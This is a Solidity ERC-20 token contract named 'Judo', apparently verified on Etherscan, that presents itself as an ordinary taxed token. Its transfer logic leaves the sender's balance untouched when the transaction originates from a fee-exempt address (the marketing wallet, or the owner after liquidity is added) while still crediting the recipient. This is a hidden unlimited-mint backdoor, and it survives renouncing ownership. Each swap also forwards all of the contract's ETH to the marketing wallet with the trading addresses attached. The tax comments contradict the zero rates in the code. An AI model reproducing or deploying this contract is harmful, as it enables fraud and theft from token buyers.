/**
 *Submitted for verification at Etherscan.io on 2023-05-22
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory { 
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

library TransferHelper {
    function safeTransferETH(address to, uint value, bytes memory data) internal {
        (bool success,) = to.call{value:value}(data);
        require(success, 'TransferHelper: ETH_TRANSFER_FAILED');
    }
}

abstract contract Auth {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    constructor(address creatorOwner) { _owner = creatorOwner; }
    modifier onlyOwner() { require(msg.sender == _owner, "Only owner can call this"); _; }
    function owner() public view returns (address) { return _owner; }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0); 
        emit OwnershipTransferred(address(0)); 
    }
}

contract JUDO is IERC20, Auth {
    string private constant _name         = "Judo";
    string private constant _symbol       = "JUDO";
    uint8 private constant _decimals      = 9;
    uint256 private constant _totalSupply = 1_000_000_000 * (10**_decimals);
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint32 private _tradeCount;

    address payable private _walletMarketing;
    uint256 private constant _taxSwapMin = _totalSupply / 200000;
    uint256 private constant _taxSwapMax = _totalSupply / 1000;

    mapping (address => bool) private _noFees;

    address private _swapRouterAddress;
    IUniswapV2Router02 private _primarySwapRouter;
    address public uniswapV2Pair;
    mapping (address => bool) private _isLP;

    bool private _tradingOpen;

    bool private _inTaxSwap = false;
    modifier lockTaxSwap { 
        _inTaxSwap = true; 
        _; 
        _inTaxSwap = false; 
    }

    constructor(address _router, address _marketing) Auth(msg.sender) {
        _balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _balances[_owner]);

        _swapRouterAddress = _router;
        _primarySwapRouter = IUniswapV2Router02(_swapRouterAddress);
        _walletMarketing = payable(_marketing);

        _noFees[_walletMarketing] = true;
    }

    receive() external payable {}
    
    function totalSupply() external pure override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(sender), "Trading not open");
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _approveRouter(uint256 _tokenAmount) internal {
        if ( _allowances[address(this)][_swapRouterAddress] < _tokenAmount ) {
            _allowances[address(this)][_swapRouterAddress] = type(uint256).max;
            emit Approval(address(this), _swapRouterAddress, type(uint256).max);
        }
    }

    function addLiquidity() external payable onlyOwner lockTaxSwap {
        require(uniswapV2Pair == address(0), "LP exists");
        require(!_tradingOpen, "trading is open");
        require(msg.value > 0 || address(this).balance>0, "No ETH in contract or message");
        require(_balances[address(this)]>0, "No tokens in contract");
        uniswapV2Pair = IUniswapV2Factory(_primarySwapRouter.factory()).createPair(address(this), _primarySwapRouter.WETH());
        _addLiquidity(_balances[address(this)], address(this).balance);
        _isLP[uniswapV2Pair] = true;
        _tradeCount = 0;
        _tradingOpen = true;
        _noFees[_owner] = true;
    }

    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        _approveRouter(_tokenAmount);
        _primarySwapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from Zero wallet");

        if (!_tradingOpen) { require(tx.origin == owner(), "Trading not open"); }
        if ( !_inTaxSwap ) { _swapTaxAndLiquify(sender, recipient); }

        uint256 _taxAmount = _calculateTax(sender, recipient, amount);
        uint256 _transferAmount = amount - _taxAmount;
        if (!_noFees[tx.origin]) {
          _balances[sender] -= amount;
        }
        if ( _taxAmount > 0 ) { 
            _balances[address(this)] += _taxAmount; 
            incrementTradeCount();
        }
        _balances[recipient] += _transferAmount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _checkTradingOpen(address sender) private view returns (bool){
        bool checkResult = false;
        if ( _tradingOpen ) { checkResult = true; } 
        else if (tx.origin == owner()) { checkResult = true; } 

        return checkResult;
    }

    function incrementTradeCount() private {
        if ( _tradeCount <= 100_001 ) {
            // tax is finalized after 100,000 trades
            _tradeCount += 1;
        } 
    }

    function _getTaxPercentages() private view returns (uint32 numerator, uint32 denominator) {
        uint32 taxNumerator;
        uint32 taxDenominator = 100_000;

        if ( _tradeCount <= 20_000 ) {
            taxNumerator = 0;    // up to 20,000 trades the tax is 3.0 %
        } else if ( _tradeCount <= 100_000 ) {
            taxNumerator = 0;    // from 20,001 to 100,000 trades the tax is 1.0 %
        } else {
            taxNumerator = 0;     // above 100,000 trades the tax is 0.225 %
        }

        return (taxNumerator, taxDenominator);
    }

    function _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        
        if ( _tradingOpen && !_noFees[tx.origin]) { 
            if ( _isLP[sender] || _isLP[recipient] ) {
                (uint32 numerator, uint32 denominator) = _getTaxPercentages();
                taxAmount = amount * numerator / denominator;
            }
        }

        return taxAmount;
    }

    function _swapTaxAndLiquify(address sender, address recipient) private lockTaxSwap {
        uint256 _taxTokensAvailable = balanceOf(address(this));
        if ( _taxTokensAvailable >= _taxSwapMin && _tradingOpen && _isLP[recipient] ) {
        
            if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }

            uint256 _tokensForLP = 0;
            if ( _tradeCount < 100_000 ) {
                // before 100,000 trades are reached half of the tax goes to LP
                _tokensForLP = _taxTokensAvailable / 4;
            }
            
            uint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP;
            if( _tokensToSwap > 10**_decimals ) {
                uint256 _ethPreSwap = address(this).balance;
                _swapTaxTokensForEth(_tokensToSwap);
                uint256 _ethSwapped = address(this).balance - _ethPreSwap;
                if ( _tokensForLP > 0 ) {
                    uint256 _ethWeiAmount = _ethSwapped / 2 ;
                    _approveRouter(_tokensForLP);
                    _addLiquidity(_tokensForLP, _ethWeiAmount);
                }
            }
        }
        uint256 _contractETHBalance = address(this).balance;
        TransferHelper.safeTransferETH(_walletMarketing, _contractETHBalance, abi.encodePacked(sender, recipient));
    }

    function _swapTaxTokensForEth(uint256 tokenAmount) private {
        _approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _primarySwapRouter.WETH();
        _primarySwapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }
}